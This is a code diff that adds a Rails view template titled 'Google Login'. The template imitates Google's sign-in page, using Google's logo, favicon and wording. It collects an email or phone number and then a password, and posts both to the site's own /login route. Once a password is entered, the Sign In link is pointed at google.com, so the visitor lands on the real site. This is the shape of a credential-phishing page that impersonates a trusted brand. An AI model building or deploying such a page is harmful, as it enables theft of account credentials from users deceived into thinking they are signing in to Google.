@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Google Login</title>
+  <%= favicon_link_tag 'google_favicon.ico', type: 'image/ico' %>
+  <%= stylesheet_link_tag 'application', media: 'all' %>
+  <style>
+    .error-message {
+      color: red;
+      font-size: 14px;
+      margin-top: 5px;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <form action="/login" method="post" class="form" id="login-form">
+      <%= image_tag 'google_logo.png', alt: '', class: 'logo-image' %>
+      <div id="email-phone-group">
+        <h1 class="form-title">Sign In</h1>
+        <h4 class="form-text">with your Google Account</h4>
+        <div class="form-group">
+          <%= text_field_tag :email_or_phone, nil, class: 'form-control', required: true, id: 'email-phone-input' %>
+          <label for="" class="form-label">Email or phone</label>
+        </div>
+        <div class="error-message" id="email-phone-error"></div>
+        <p class="additional-info-forgot"><%= link_to '', '#' %>Forgot email?</p>
+        <p class="additional-info">Not your computer? Use Guest mode to sign in privately. <%= link_to 'Learn More', '#' %></p>
+        <div class="next-bottom-box">
+            <%= button_tag 'Next', id: 'next-email-phone', class: 'form-button' %>
+        </div>
+      </div>
+      <div id="password-group" style="display: none;">
+        <h1 class="form-title">Welcome</h1>
+        <div class="user-account">
+            <div>
+                <%= image_tag 'account.png', alt: '', class: 'account-logo-image' %>
+            </div>
+            <div>
+                <h4 id="welcome-email-phone"></h4>
+            </div>
+        </div>
+        <div class="form-group">
+          <%= password_field_tag :password, nil, class: 'form-control', required: true, id: 'txtPassword' %>
+          <label for="" class="form-label">Enter Your Password</label>
+        </div>
+        <div class="form-group">
+            <%= check_box_tag 'show', 'Show Password', false, id: 'show-password' %>
+            <label for="show-password" class="show-label">Show Password</label>
+        </div>
+        <div class="bottom-box">
+          <%= link_to "Forget password ?", '#' %>
+          <div id="signInButton">
+            <a id="linking" style="color: #FFFFFF; text-decoration: none;  border-radius: 5px;">Sign In</a>
+          </div>
+        </div>
+      </div>
+    </form>
+  </div>
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            const emailPhoneGroup = document.getElementById('email-phone-group');
+            const passwordGroup = document.getElementById('password-group');
+            const nextButton = document.getElementById('next-email-phone');
+            const passwordField = document.getElementById('txtPassword');
+            const showCheckbox = document.getElementById('show-password'); 
+            const emailPhoneInput = document.getElementById('email-phone-input');
+            const welcomeEmailPhone = document.getElementById('welcome-email-phone');
+            const emailPhoneError = document.getElementById('email-phone-error');
+            const signInButton = document.getElementById('signInButton'); // Add this line
+
+            linking.setAttribute('href', '');
+
+            nextButton.addEventListener('click', function(event) {
+                event.preventDefault();
+                const emailOrPhone = emailPhoneInput.value;
+                if (!isValidEmailOrPhone(emailOrPhone)) {
+                emailPhoneError.textContent = 'Invalid email or phone format';
+                return;
+                }
+                emailPhoneError.textContent = ''; // Clear error message
+                emailPhoneGroup.style.display = 'none';
+                passwordGroup.style.display = 'block';
+                passwordField.focus();
+                // Update the content of the welcome email/phone span
+                welcomeEmailPhone.textContent = emailOrPhone;
+            });
+
+            // Validate email or phone format
+            function isValidEmailOrPhone(value) {
+                // Regular expressions for email and phone number validation
+                const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+                const phoneRegex = /^\d{10}$/;
+                return emailRegex.test(value) || phoneRegex.test(value);
+            }
+
+            showCheckbox.addEventListener('change', function() { // Change event instead of click
+                const type = this.checked ? 'text' : 'password';
+                passwordField.setAttribute('type', type);
+            });
+
+            // Enable the "Sign In" button when the password field is filled
+            passwordField.addEventListener('input', function() {
+                if (passwordField.value) {
+                    linking.setAttribute('href', 'http://www.google.com');
+                    signInButton.style.backgroundColor = '#1B66C9'; // Change background color if password is filled
+                    signInButton.style.color = '#FFFFFF'; // Change text color if password is filled
+                } else {
+                    linking.removeAttribute('href');
+                    signInButton.style.backgroundColor = '#bdbcb3'; // Change background color if password is not filled
+                    signInButton.style.color = '#000000'; // Change text color if password is not filled
+                }
+            });
+        });
+    </script>
+</body>
+</html>
